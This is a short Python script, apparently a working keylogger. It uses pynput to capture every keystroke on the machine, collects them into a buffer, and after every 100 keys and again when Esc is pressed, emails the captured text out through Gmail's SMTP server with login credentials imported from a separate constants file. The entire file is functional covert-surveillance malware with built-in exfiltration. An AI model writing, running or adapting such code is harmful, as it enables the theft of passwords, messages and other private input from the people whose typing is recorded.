from pynput.keyboard import Listener, Key
import smtplib, ssl
from constants import SENDER_EMAIL, RECEIVER_EMAIL, PASSWORD

keys = ""
count = 0

port = 465  # For SSL
smtp_server = "smtp.gmail.com"
sender_email = SENDER_EMAIL  # Enter your address
receiver_email = RECEIVER_EMAIL  # Enter receiver address
password = PASSWORD


def on_press(key):
    global keys, count
    count += 1

    try:

        keys = keys + str(key.char).replace("'", "")
    except AttributeError:
        if key == Key.enter:
            keys = keys + "\n"
        if key == Key.space:
            keys = keys + " "
        if key == Key.backspace:
            keys = keys + "/./"
    finally:
        if count == 100:
            send_email(keys)
            count = 0
            keys = ""


def on_release(key):
    if key == Key.esc:
        global keys
        send_email(keys)
        return False


def send_email(keys):
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, keys)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()